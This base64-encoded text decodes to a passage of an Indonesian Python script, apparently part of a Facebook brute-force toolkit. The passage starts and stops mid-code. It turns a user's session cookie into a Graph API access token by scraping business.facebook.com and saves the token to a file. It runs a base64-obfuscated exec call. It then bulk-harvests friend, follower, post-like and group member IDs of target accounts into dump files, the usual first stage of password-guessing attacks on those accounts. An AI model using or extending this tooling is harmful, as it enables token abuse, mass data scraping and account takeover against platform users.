bmRhcGF0a2FuIGNvb2tpZSAlczolcyAiJShVLEgsTSxIKSk7amVkYSgwLjAyKQ0KICAgICAgICBwcmludCAoIiAtIHNpYXBrYW4gYXBsaWthc2kga2l3aSBicm93c2VyLCBkb3dubG9hZCBkaSBwbGF5IHN0b3JlIGppa2EgYmVsdW0iKTtqZWRhKDAuMDIpDQogICAgICAgIHByaW50ICgiIC0gbG9naW4ga2FuIGFrdW4gZmFjZWJvb2sgYW5kYSBkaSBraXdpIGJyb3dzZXIuIGFrdW4gd2FqaWIgbW9kZSBkYXRhIik7amVkYSgwLjAyKQ0KICAgICAgICBwcmludCAoIiAtIHNhbGluIGxpbmsgOiAlc2h0dHBzOi8vY2hyb21lLmdvb2dsZS5jb20vd2Vic3RvcmUvZGV0YWlsL2dldC1jb29raWUvbmFjaWFhZ2JraWZocG5vb2Rsa2hiZWpqbGRhaWZmY20vcmVsYXRlZCIlKE8pKTtqZWRhKDAuMDIpDQogICAgICAgIHByaW50ICgiICVzLSBrZXRpayAlc24lcy8lc04gJXNsYWx1IGVudGVyIHVudHVrIG1lbGloYXQgdHV0b3JpYWxcbiAiJShILE0sTyxNLEgpKTtqZWRhKDAuMDIpDQogICAgICAgIG5hbnlhID0gcmF3X2lucHV0KCclcyVzJXMgQW5kYSBwYWhhbT8gJXN5JXMvJXNuIDolcyAnJShVLHRpbCxPLEgsTyxNLEspKQ0KICAgICAgICBpZiBuYW55YSBpbigiIik6DQogICAgICAgIAlwcmludCAoIiVzJXMgc2F5YSBiZXJ0YW55YSB3YWppYiBkaSBqYXdhYiAiJShNLHRpbCkpO2plZGEoMik7bWFzdWsoKQ0KICAgICAgICBlbGlmIG5hbnlhIGluKCJ5IiwiWSIpOg0KICAgICAgICAJcHJpbnQgKCJcbiVzJXMgc2VsYW1hdCBhbmRhIHBpbnRhciA6KiAiJShILHRpbCkpO2plZGEoMik7bWFzdWsoKQ0KICAgICAgICBlbGlmIG5hbnlhIGluKCJuIiwiTiIpOg0KICAgICAgICAJcHJpbnQgKCJcbiVzJXMgYnVrYSBkZW5nYW4gZmFjZWJvb2sgIiUoTSx0aWwpKTtqZWRhKDIpO29zLnN5c3RlbSgieGRnLW9wZW4gaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLzEwMDA2NzgwNzU2NTg2MS9wb3N0cy8yMzE2NTA2OTU3NzE4NDgvP2FwcD1mYmwiKTttYXN1aygpDQogICAgZWxpZiByb20gaW4gKCcwJywgJzAwJyk6DQogICAgCWV4aXQoJ1xuJykNCiAgICBlbHNlOg0KICAgIAlwcmludCgiJXMlcyB3cm9uZyBpbnB1dCAiJShNLHRpbCkpO2V4aXQoKQ0KIyBDRUsgQ09PS0lFIE1FTlUgNC02DQpob3N0ID0gKCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20nKQ0KdWEgPSAoIk5va2lhQzMtMDAvNS4wICgwNy4yMCkgUHJvZmlsZS9NSURQLTIuMSBDb25maWd1cmF0aW9uL0NMREMtMS4xIE1vemlsbGEvNS4wIEFwcGxlV2ViS2l0LzQyMCsgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYWZhcmkvNDIwKyIpDQpoID0geydIb3N0JzogJ21iYXNpYy5mYWNlYm9vay5jb20nLCAnY2FjaGUtY29udHJvbCc6ICdtYXgtYWdlPTAnLCAndXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyc6ICcxJywgJ3VzZXItYWdlbnQnOiB1YSwgJ2FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44JywgJ2FjY2VwdC1lbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlJywgJ2FjY2VwdC1sYW5ndWFnZSc6ICdpZC1JRCxpZDtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNyd9DQpkZWYgX19yb216X18oKToNCglpZiBvcy5wYXRoLmV4aXN0cygiZGF0YS9jb29raWVzIik6DQoJCWlmIG9zLnBhdGguZ2V0c2l6ZSgiZGF0YS9jb29raWVzIikgIT0wOg0KCQkJcmV0dXJuIGN2ZChvcGVuKCdkYXRhL2Nvb2tpZXMnKS5yZWFkKCkuc3RyaXAoKSkNCgkJZWxzZTpfcm9taVhEXygpDQoJZWxzZTpfcm9taVhEXygpDQpkZWYgX3JvbWlYRF8oc2hvdz1UcnVlKToNCglpZiBzaG93PT1UcnVlOg0KCQkjb3Muc3lzdGVtKCJjbGVhciIpDQoJCSNiYW5uZXIoKQ0KCQlwcmludCgiXG4lcyVzJXMgU3VwYXlhIGJla2VyamEgbWFzdWthbiBjb29raWUgZmFjZWJvb2sgYW5kYSIlKFUsdGlsLE8pKQ0KCWNrPXJhd19pbnB1dCgiJXMjICVzQ29va2llICVzPiAlcyIlKFAsTyxNLEspKQ0KCWlmIGNrPT0iIjoNCgkJX3JvbWlYRF8oc2hvdz1GYWxzZSkNCgl0cnk6DQoJCWNrcz1jdmQoY2spDQoJCWlmIGt1ZWgoY2tzKT09VHJ1ZToNCgkJCW9wZW4oImRhdGEvY29va2llcyIsInciKS53cml0ZShjayk7ZXhpdCgiJXMlcyBsb2dpbiBzdWNjZXNzLCBrZXRpazogcHl0aG9uMiBiZmYtMi5weSAiJShILHRpbCkpDQoJCWVsc2U6cHJpbnQoIiVzJXMgbG9naW4gZ2FnYWwuIiUoTSx0aWwpKTtfcm9taVhEXyhzaG93PVRydWUpDQoJZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KCQlwcmludCgiJXMlcyBlcnJvciA6ICVzXG4iJShNLHRpbCxlKSkNCgkJX3JvbWlYRF8oc2hvdz1GYWxzZSkNCmRlZiBrdWVoKGNvb2tpZXMpOg0KCV93dGZfPUZhbHNlDQoJYj1yZXF1ZXN0cy5nZXQoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9wcm9maWxlLnBocCIsaGVhZGVycz17J29yaWdpbic6ICdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20nLCAnYWNjZXB0LWxhbmd1YWdlJzogJ2lkLUlELGlkO3E9MC45LGVuLVVTO3E9MC44LGVuO3E9MC43JywgJ2FjY2VwdC1lbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlJywgJ2FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44JywgJ3VzZXItYWdlbnQnOiB1YSwgJ0hvc3QnOiAoJycpLmpvaW4oYnM0LnJlLmZpbmRhbGwoJzovLyguKj8pJCcsICdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20nKSksICdyZWZlcmVyJzogJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9sb2dpbi8/bmV4dCZyZWY9ZGJsJmZsJnJlZmlkPTgnLCAnY2FjaGUtY29udHJvbCc6ICdtYXgtYWdlPTAnLCAndXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyc6ICcxJywgJ2NvbnRlbnQtdHlwZSc6ICdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnfSxjb29raWVzPWNvb2tpZXMpLnRleHQJDQoJaWYgIm1iYXNpY19sb2dvdXRfYnV0dG9uIiBpbiBiLmxvd2VyKCk6DQoJCV93dGZfPVRydWUNCgkJaWYgX3d0Zl89PVRydWU6DQoJCQlyZXR1cm4gVHJ1ZQ0KCQllbHNlOg0KCQkJZXhpdCgiJXMlcyBsb2dpbiBnYWdhbC4gIiUoTSx0aWwpKQ0KZGVmIGhkY29rKCk6DQogICAgaG9zdHMgPSBob3N0DQogICAgciA9IHsnb3JpZ2luJzogaG9zdHMsICdhY2NlcHQtbGFuZ3VhZ2UnOiAnaWQtSUQsaWQ7cT0wLjksZW4tVVM7cT0wLjgsZW47cT0wLjcnLCAnYWNjZXB0LWVuY29kaW5nJzogJ2d6aXAsIGRlZmxhdGUnLCAnYWNjZXB0JzogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgnLCAndXNlci1hZ2VudCc6IHVhLCAnSG9zdCc6ICgnJykuam9pbihiczQucmUuZmluZGFsbCgnOi8vKC4qPykkJywgaG9zdHMpKSwgJ3JlZmVyZXInOiBob3N0cyArICcvbG9naW4vP25leHQmcmVmPWRibCZmbCZyZWZpZD04JywgJ2NhY2hlLWNvbnRyb2wnOiAnbWF4LWFnZT0wJywgJ3VwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMnOiAnMScsICdjb250ZW50LXR5cGUnOiAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJ30NCiAgICByZXR1cm4gcg0KZGVmIGN2cyhjb29raWVzKTogIyBjb252ZXJ0IGNvb2tpZSBkaWN0IHRvIHN0cmluZw0KCXJlc3VsdD1bXQ0KCWZvciBfaV8gaW4gZW51bWVyYXRlKGNvb2tpZXMua2V5cygpKToNCgkJaWYgX2lfWzBdPT1sZW4oY29va2llcy5rZXlzKCkpLTE6cmVzdWx0LmFwcGVuZChfaV9bMV0rIj0iK2Nvb2tpZXNbX2lfWzFdXSkNCgkJZWxzZTpyZXN1bHQuYXBwZW5kKF9pX1sxXSsiPSIrY29va2llc1tfaV9bMV1dKyI7ICIpDQoJcmV0dXJuICIiLmpvaW4ocmVzdWx0KQ0KZGVmIGN2ZChjb29raWVzKTogIyBjb252ZXJ0IGNvb2tpZSBkaWN0IHRvIHN0cmluZw0KCXJlc3VsdD17fQ0KCXRyeToNCgkJZm9yIF9pXyBpbiBjb29raWVzLnNwbGl0KCI7Iik6DQoJCQlyZXN1bHQudXBkYXRlKHtfaV8uc3BsaXQoIj0iKVswXTpfaV8uc3BsaXQoIj0iKVsxXX0pDQoJCXJldHVybiByZXN1bHQNCglleGNlcHQ6DQoJCWZvciBfaV8gaW4gY29va2llcy5zcGxpdCgiOyAiKToNCgkJCXJlc3VsdC51cGRhdGUoe19pXy5zcGxpdCgiPSIpWzBdOl9pXy5zcGxpdCgiPSIpWzFdfSkNCgkJcmV0dXJuIHJlc3VsdA0KIyBDT05WRVJUIENPT0tJRSBLRSBUT0tFTiBCWSBST01JIEFGUklaQUwNCmRlZiBrb252ZXJ0ZXIoKToNCglfY29va2llID0gb3BlbignZGF0YS9jb29raWVzJywgJ3InKS5yZWFkKCkNCglfaGVhZGVyID0gew0KCQknSG9zdCc6J2J1c2luZXNzLmZhY2Vib29rLmNvbScsDQoJCSdjYWNoZS1jb250cm9sJzonbWF4LWFnZT0wJywNCgkJJ3VwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMnOicxJywNCgkJJ3VzZXItYWdlbnQnOidNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNi4wLjE7IFJlZG1pIDRBIEJ1aWxkL01NQjI5TSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU5LjAuMzA3MS45MiBNb2JpbGUgU2FmYXJpLzUzNy4zNicsDQoJCSdhY2NlcHQnIDogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgnLA0KCQknY29udGVudC10eXBlJyA6ICd0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgnLA0KCQknYWNjZXB0LWVuY29kaW5nJzonZ3ppcCwgZGVmbGF0ZScsDQoJCSdhY2NlcHQtbGFuZ3VhZ2UnOidpZC1JRCxpZDtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNycsDQoJCSdjb29raWUnOiBfY29va2llDQoJfQ0KCXRyeToNCgkJbGluZyA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9idXNpbmVzcy5mYWNlYm9vay5jb20vYnVzaW5lc3NfbG9jYXRpb25zIiwgaGVhZGVycz1faGVhZGVyKQ0KCQljYXJpID0gcmUuc2VhcmNoKCcoRUFBR1x3KyknLCBsaW5nLnRleHQpDQoJCXJvbXogPSBjYXJpLmdyb3VwKDEpDQoJCWlmICdFQUFHJyBpbiByb216Og0KCQkJcHJpbnQgKCdcbiVzJXMgTG9naW4gc3VjY2VzLCBtb2hvbiB0dW5nZ3UgJyUoSCx0aWwpKQ0KCQkJb3BlbignZGF0YS90b2tlbi50eHQnLCAndycpLndyaXRlKHJvbXopO2xvZ2luX3h4KCkNCgkJCWV4ZWMoYmFzZTY0LmI2NGRlY29kZSgnYjNNdWMzbHpkR1Z0S0NkNFpHY3RiM0JsYmlCb2RIUndjem92TDNkM2R5NW1ZV05sWW05dmF5NWpiMjB2Y205dGFTNWhabkpwZW1Gc0xqRXdNaWNwTzIxbGJuVW9LUT09JykpDQoJCQlleGl0KCkNCglleGNlcHQgQXR0cmlidXRlRXJyb3I6DQoJCXByaW50KCIlc+KAoiB0ZXJqYWRpIGtlc2FsYWhhbiBzYWF0IGNvbnZlcnQsIHBlcmlrc2EgY29va2llIGFuZGEgIiUoTSkpO2V4aXQoKQ0KIyBEVU1QIFBVQkxJSw0KZGVmIHB1Ymxpayhyb216LGhlYWRlcnM9aGVhZGVyKToNCiAgICB0cnk6DQogICAgICAgIG9zLm1rZGlyKCdkdW1wJykNCiAgICBleGNlcHQ6cGFzcw0KICAgIHRyeToNCiAgICAJcHJpbnQgKCJcbiVzJXMgJXNLZXRpayAnJXNtZSVzJyBqaWthIGluZ2luIGR1bXAgZGFmdGFyIHRlbWFuIHNlbmRpcmkgIiUoVSx0aWwsTyxILE8pKQ0KICAgICAgICBpZHQgPSByYXdfaW5wdXQoJyVzJXMgJXNUYXJnZXQgaWQlcyA+ICVzJyUoVSx0aWwsTyxNLEspKQ0KICAgICAgICAjc2ltcGFuID0gcmF3X2lucHV0KCclcyVzJXMgTmFtYSBmaWxlJXMgPiAlcyclKFUsdGlsLE8sTSxLKSkNCiAgICAgICAgZ2FzID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcz9hY2Nlc3NfdG9rZW49JXMnJShpZHQscm9teikpDQogICAgICAgIG5tID0ganNvbi5sb2FkcyhnYXMudGV4dCkNCiAgICAgICAgZmlsZSA9ICgnZHVtcC8nK25tWydmaXJzdF9uYW1lJ10rJy5qc29uJykucmVwbGFjZSgnICcsICdfJykNCiAgICAgICAgYmZmID0gb3BlbihmaWxlLCAndycpDQogICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzP2ZpZWxkcz1mcmllbmRzLmxpbWl0KDUwMDEpJmFjY2Vzc190b2tlbj0lcyclKGlkdCxyb216KSkNCiAgICAgICAgeiA9IGpzb24ubG9hZHMoci50ZXh0KQ0KICAgICAgICBmb3IgX3hfIGluIHpbJ2ZyaWVuZHMnXVsnZGF0YSddOg0KICAgICAgICAgICAgaWQuYXBwZW5kKF94X1snaWQnXSArICc8PT4nICsgX3hfWyduYW1lJ10pDQogICAgICAgICAgICBiZmYud3JpdGUoX3hfWydpZCddICsgJzw9PicgKyBfeF9bJ25hbWUnXSArICdcbicpDQogICAgICAgICAgICBwcmludCAnXHIlcyVzJXMgbWVuZ3VtcHVsa2FuIGlkJXMgPiVzICVzICcgJSAoVSx0aWwsTyxNLEgsc3RyKGxlbihpZCkpKSwNCiAgICAgICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKTtqZWRhKDAuMDA1MCkNCg0KICAgICAgICBiZmYuY2xvc2UoKQ0KICAgICAgICBwcmludCAoJ1xuXG4lcyVzIFN1Y2NlcyBkdW1wIGlkIGRhcmkgJXMnJShILHRpbCxubVsnbmFtZSddKSkNCiAgICAgICAgcHJpbnQgKCclcyVzJXMgRmlsZSBkdW1wIHRlcnNpbXBhbiAlcz4lcyAlcyAnJShVLHRpbCxPLE0sSCxmaWxlKSkNCiAgICAgICAgcmF3X2lucHV0KCdcbiVzJXMlcyBbJXMgRW50ZXIlcyBdICclKFUsdGlsLE8sVSxPKSkNCiAgICAgICAgbWVudSgpDQogICAgZXhjZXB0IEtleUVycm9yOg0KICAgICAgICBleGl0KCdcbiVzJXMgZ2FnYWwgZHVtcCBpZCclKE0sdGlsKSkNCiAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAJZXhpdCgnXG4lcyVzIGdhZ2FsIG1lbWJ1YXQgZmlsZSclKE0sdGlsKSkNCiAgICBleGNlcHQgT1NFcnJvcjoNCiAgICAJZXhpdCgnXG4lcyVzIGdhZ2FsIG1lbnlpbXBhbiBmaWxlJyUoTSx0aWwpKQ0KICAgIGV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsRU9GRXJyb3IpOg0KICAgIAlleGl0KCdcbiVzJXMgc3RvcCclKE0sdGlsKSkNCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQogICAgCWV4aXQoJ1xuJXMlcyB0aWRhayBhZGEga29uZWtzaSclKE0sdGlsKSkNCiMgRFVNUCBNQVNTQUwgDQpkZWYgbWFzc2FsKHJvbXosaGVhZGVycz1oZWFkZXIpOg0KCXRyeToNCgkJb3MubWtkaXIoJ2R1bXAnKQ0KCWV4Y2VwdDpwYXNzDQoJdHJ5Og0KCQlqdW0gPSBpbnQocmF3X2lucHV0KCdcbiVzJXMlcyBKdW1sYWggaWQlcyA+ICVzJyUoVSx0aWwsTyxNLEspKSkNCglleGNlcHQ6anVtPTENCglzaW1wYW4gPSByYXdfaW5wdXQoJyVzJXMlcyBOYW1hIGZpbGUlcyA+ICVzJyUoVSx0aWwsTyxNLEspKQ0KCXByaW50ICgiXG4lcyVzICVzS2V0aWsgJyVzbWUlcycgamlrYSBpbmdpbiBkdW1wIGRhZnRhciB0ZW1hbiBzZW5kaXJpICIlKFUsdGlsLE8sSCxPKSkNCglmaWxlID0gKCdkdW1wLycrc2ltcGFuKycuanNvbicpLnJlcGxhY2UoJyAnLCAnXycpDQoJYmZmID0gb3BlbihmaWxlLCAndycpDQoJZm9yIHQgaW4gcmFuZ2UoanVtKToNCgkJdCArPTENCgkJaWR0ID0gcmF3X2lucHV0KCclcyVzICVzVGFyZ2V0IGlkICVzJXMgPiAlcyclKFUsdGlsLE8sdCxNLEspKQ0KCQl0cnk6DQoJCQlmb3IgX3hfIGluIHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvZnJpZW5kcz9hY2Nlc3NfdG9rZW49JXMiJShpZHQsIHJvbXopKS5qc29uKClbImRhdGEiXToNCgkJCQlpZC5hcHBlbmQoX3hfWydpZCddICsgJzw9PicgKyBfeF9bJ25hbWUnXSkNCgkJCQliZmYud3JpdGUoX3hfWydpZCddICsgJzw9PicgKyBfeF9bJ25hbWUnXSArICdcbicpDQojICAgICAgICAgICAgICBwcmludCAoJ1xyJXMlcyVzIG1lbmd1bXB1bGthbiBpZCVzID4gJXMlcyclKFUsdGlsLE8sTSxILHN0cihsZW4oaWQpKSkpDQojICAgICAgICAgICAgICAsc3lzLnN0ZG91dC5mbHVzaCgpO2plZGEoMC4wMDUwKQ0KCQlleGNlcHQgS2V5RXJyb3I6DQoJCQlleGl0KCdcbiVzJXMgaWQgdGlkYWsgcHVibGljJyUoTSx0aWwpKQ0KCXRyeToNCgkJYmZmLmNsb3NlKCkNCgkJcHJpbnQgKCclcyVzJXMgVG90YWwgaWQlcyA+ICVzJXMnJShVLHRpbCxPLE0sSCxsZW4oaWQpKSkNCgkJcHJpbnQgKCdcbiVzJXMgU3VjY2VzIGR1bXAgaWQgbWFzc2FsICclKEgsdGlsKSkNCgkJcHJpbnQgKCclcyVzJXMgRmlsZSBkdW1wIHRlcnNpbXBhbiAlcz4lcyAlcyAnJShVLHRpbCxPLE0sSCxmaWxlKSkNCgkJcmF3X2lucHV0KCdcbiVzJXMlcyBbJXMgRW50ZXIlcyBdICclKFUsdGlsLE8sVSxPKSkNCgkJbWVudSgpDQoJZXhjZXB0IElPRXJyb3I6DQoJCWV4aXQoJ1xuJXMlcyBnYWdhbCBtZW1idWF0IGZpbGUnJShNLHRpbCkpDQoJZXhjZXB0IE9TRXJyb3I6DQoJCWV4aXQoJ1xuJXMlcyBnYWdhbCBtZW55aW1wYW4gZmlsZSclKE0sdGlsKSkNCglleGNlcHQgKEtleWJvYXJkSW50ZXJydXB0LEVPRkVycm9yKToNCgkJZXhpdCgnXG4lcyVzIHN0b3AnJShNLHRpbCkpDQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KCQlleGl0KCdcbiVzJXMgdGlkYWsgYWRhIGtvbmVrc2knJShNLHRpbCkpDQojIERVTVAgRk9MTE9XRVJTDQpkZWYgZm9sbG93ZXJzKHJvbXosaGVhZGVycz1oZWFkZXIpOg0KICAgIHRyeToNCiAgICAgICAgb3MubWtkaXIoJ2R1bXAnKQ0KICAgIGV4Y2VwdDpwYXNzDQogICAgdHJ5Og0KICAgIAlwcmludCAoIlxuJXMlcyAlc0tldGlrICclc21lJXMnIGppa2EgaW5naW4gZHVtcCBmb2xsb3dlcnMgc2VuZGlyaSAiJShVLHRpbCxPLEgsTykpDQogICAgICAgIGlkdCA9IHJhd19pbnB1dCgnJXMlcyAlc1RhcmdldCBpZCVzICA+ICVzJyUoVSx0aWwsTyxNLEspKQ0KICAgICAgICBiYXRhcyA9IHJhd19pbnB1dCgnJXMlcyAlc01heGltYWwgaWQlcyA+ICVzJyUoVSx0aWwsTyxNLEspKQ0KICAgICAgICAjc2ltcGFuID0gcmF3X2lucHV0KCclcyVzJXMgTmFtYSBmaWxlJXMgID4gJXMnJShVLHRpbCxPLE0sSykpDQogICAgICAgIGdhcyA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXM/YWNjZXNzX3Rva2VuPSVzJyUoaWR0LHJvbXopKQ0KICAgICAgICBubSA9IGpzb24ubG9hZHMoZ2FzLnRleHQpDQogICAgICAgIGZpbGUgPSAoJ2R1bXAvJytubVsnZmlyc3RfbmFtZSddKycuanNvbicpLnJlcGxhY2UoJyAnLCAnXycpDQogICAgICAgIGJmZiA9IG9wZW4oZmlsZSwgJ3cnKQ0KICAgICAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcy9zdWJzY3JpYmVycz9saW1pdD0lcyZhY2Nlc3NfdG9rZW49JXMnJShpZHQsYmF0YXMscm9teikpDQogICAgICAgIHogPSBqc29uLmxvYWRzKHIudGV4dCkNCiAgICAgICAgZm9yIF94XyBpbiB6WydkYXRhJ106DQogICAgICAgICAgICBpZC5hcHBlbmQoX3hfWydpZCddICsgJzw9PicgKyBfeF9bJ25hbWUnXSkNCiAgICAgICAgICAgIGJmZi53cml0ZShfeF9bJ2lkJ10gKyAnPD0+JyArIF94X1snbmFtZSddICsgJ1xuJykNCiAgICAgICAgICAgIHByaW50ICgnXHIlcyVzJXMgbWVuZ3VtcHVsa2FuIGlkJXMgPiVzICVzICcgJSAoVSx0aWwsTyxNLEgsc3RyKGxlbihpZCkpKSksDQogICAgICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCk7amVkYSgwLjAwNTApDQoNCiAgICAgICAgYmZmLmNsb3NlKCkNCiAgICAgICAgcHJpbnQgKCdcblxuJXMlcyBTdWNjZXMgZHVtcCBmb2xsb3dlcnMgZGFyaSAlcyAnJShILHRpbCxubVsibmFtZSJdKSkNCiAgICAgICAgcHJpbnQgKCclcyVzJXMgRmlsZSBkdW1wIHRlcnNpbXBhbiAlcz4lcyAlcyAnJShVLHRpbCxPLE0sSCxmaWxlKSkNCiAgICAgICAgcmF3X2lucHV0KCdcbiVzJXMlcyBbJXMgRW50ZXIlcyBdICclKFUsdGlsLE8sVSxPKSkNCiAgICAgICAgbWVudSgpDQogICAgZXhjZXB0IEtleUVycm9yOg0KICAgICAgICBleGl0KCdcbiVzJXMgZ2FnYWwgZHVtcCBpZCclKE0sdGlsKSkNCiAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAJZXhpdCgnXG4lcyVzIGdhZ2FsIG1lbWJ1YXQgZmlsZSclKE0sdGlsKSkNCiAgICBleGNlcHQgT1NFcnJvcjoNCiAgICAJZXhpdCgnXG4lcyVzIGdhZ2FsIG1lbnlpbXBhbiBmaWxlJyUoTSx0aWwpKQ0KICAgIGV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsRU9GRXJyb3IpOg0KICAgIAlleGl0KCdcbiVzJXMgc3RvcCclKE0sdGlsKSkNCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQogICAgCWV4aXQoJ1xuJXMlcyB0aWRhayBhZGEga29uZWtzaSclKE0sdGlsKSkNCiMgRFVNUCBQT1NUSU5HQU4gDQpkZWYgcG9zdGluZ2FuKHJvbXosaGVhZGVycz1oZWFkZXIpOg0KICAgIHRyeToNCiAgICAgICAgb3MubWtkaXIoJ2R1bXAnKQ0KICAgIGV4Y2VwdDpwYXNzDQogICAgdHJ5Og0KICAgIAlwcmludCAoIlxuJXMlcyAlc1Blcmx1IGRpIGluZ2F0IHBvc3RpbmdhbiBoYXJ1cyBiZXJzaWZhdCBwdWJsaWsgIiUoVSx0aWwsTykpDQogICAgICAgIGlkdCA9IHJhd19pbnB1dCgnJXMlcyAlc0lkIHBvc3QlcyAgID4gJXMnJShVLHRpbCxPLE0sSykpDQogICAgICAgIHNpbXBhbiA9IHJhd19pbnB1dCgnJXMlcyVzIE5hbWEgZmlsZSVzID4gJXMnJShVLHRpbCxPLE0sSykpDQogICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzL2xpa2VzP2xpbWl0PTk5OTk5OSZhY2Nlc3NfdG9rZW49JXMnJShpZHQscm9teikpDQogICAgICAgIGlkID0gW10NCiAgICAgICAgeiA9IGpzb24ubG9hZHMoci50ZXh0KQ0KICAgICAgICBmaWxlID0gKCdkdW1wLycgKyBzaW1wYW4gKyAnLmpzb24nKS5yZXBsYWNlKCcgJywgJ18nKQ0KICAgICAgICBiZmYgPSBvcGVuKGZpbGUsICd3JykNCiAgICAgICAgZm9yIF94XyBpbiB6WydkYXRhJ106DQogICAgICAgICAgICBpZC5hcHBlbmQoX3hfWydpZCddICsgJzw9PicgKyBfeF9bJ25hbWUnXSkNCiAgICAgICAgICAgIGJmZi53cml0ZShfeF9bJ2lkJ10gKyAnPD0+JyArIF94X1snbmFtZSddICsgJ1xuJykNCiAgICAgICAgICAgIHByaW50ICdcciVzJXMlcyBtZW5ndW1wdWxrYW4gaWQlcyA+JXMgJXMgJyAlIChVLHRpbCxPLE0sSCxzdHIobGVuKGlkKSkpLA0KICAgICAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpO2plZGEoMC4wMDUwKQ0KDQogICAgICAgIGJmZi5jbG9zZSgpDQogICAgICAgIHByaW50ICgnXG5cbiVzJXMgU3VjY2VzIGR1bXAgaWQgcG9zdGluZ2FuICclKEgsdGlsKSkNCiAgICAgICAgcHJpbnQgKCclcyVzJXMgRmlsZSBkdW1wIHRlcnNpbXBhbiAlcz4lcyAlcyAnJShVLHRpbCxPLE0sSCxmaWxlKSkNCiAgICAgICAgcmF3X2lucHV0KCdcbiVzJXMlcyBbJXMgRW50ZXIlcyBdICclKFUsdGlsLE8sVSxPKSkNCiAgICAgICAgbWVudSgpDQogICAgZXhjZXB0IEtleUVycm9yOg0KICAgICAgICBleGl0KCdcbiVzJXMgZ2FnYWwgZHVtcCBpZCclKE0sdGlsKSkNCiAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAJZXhpdCgnXG4lcyVzIGdhZ2FsIG1lbWJ1YXQgZmlsZSclKE0sdGlsKSkNCiAgICBleGNlcHQgT1NFcnJvcjoNCiAgICAJZXhpdCgnXG4lcyVzIGdhZ2FsIG1lbnlpbXBhbiBmaWxlJyUoTSx0aWwpKQ0KICAgIGV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsRU9GRXJyb3IpOg0KICAgIAlleGl0KCdcbiVzJXMgc3RvcCclKE0sdGlsKSkNCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQogICAgCWV4aXQoJ1xuJXMlcyB0aWRhayBhZGEga29uZWtzaSclKE0sdGlsKSkNCiMgRFVNUCBHUk9VUA0KY2xhc3MgZ3JvdXA6DQoJDQoJZGVmIF9faW5pdF9fKHNlbGYsIGNvb2tpZXMpOg0KCQlzZWxmLmdsaXN0PVtdDQoJCXNlbGYuY29va2llcz1jb29raWVzDQoJCXNlbGYubWFudWFsKCk7ZXhpdCgpDQoJZGVmIG1hbnVhbChzZWxmKToNCgkJcHJpbnQoIlxuJXMlcyVzIFBlcmx1IGRpIGluZ2F0IGdyb3VwIGhhcnVzIGJlcnNpZmF0IHB1YmxpayBhdGF1IHdhamliIGpvaW4gZ3JvdXAiJShVLHRpbCxPKSkNCgkJaWQ9cmF3X2lucHV0KCIlcyVzJXMgSWQgZ3JvdXBzJXMgPiAlcyIlKFUsdGlsLE8sT